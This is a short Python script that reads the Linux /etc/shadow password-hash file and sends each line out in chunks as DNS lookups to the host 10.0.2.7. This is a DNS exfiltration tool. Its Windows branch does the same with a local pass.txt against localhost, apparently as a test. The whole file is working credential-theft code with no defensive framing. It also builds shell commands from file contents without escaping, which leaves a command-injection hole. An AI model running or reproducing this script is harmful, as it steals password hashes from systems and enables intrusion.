#!/usr/bin/python3
import os
import subprocess


def run():
    passfile = open("/etc/shadow", "r")
    content = passfile.read()
    content_list = content.splitlines()
    passfile.close()
    for i in content_list:
            strr = i+""
            firstpart, secondpart = strr[:62], strr[62:]
            s = firstpart + " 10.0.2.7"
            s2 = secondpart + " 10.0.2.7"
            os.system('nslookup ' + s)
            os.system('nslookup ' + s2)
            # subprocess.Popen(["nslookup", i[:len(i) / 2], "10.0.2.7"], stdout=subprocess.PIPE)
            # subprocess.Popen(["nslookup", i[len(i) / 2:], "10.0.2.7"], stdout=subprocess.PIPE)


def run2():
    passfile = open("D:\\Users\\free\\Desktop\\pass.txt", "r")
    content = passfile.read()
    content_list = content.splitlines()
    passfile.close()
    for i in content_list:
        s = i + ' 127.0.0.1'
        s2 = i + ' 127.0.0.1'
        os.system('nslookup '+s)
        os.system('nslookup '+s2)


if __name__ == '__main__':
    if os.name == 'nt':
        run2()
    else:
        run()
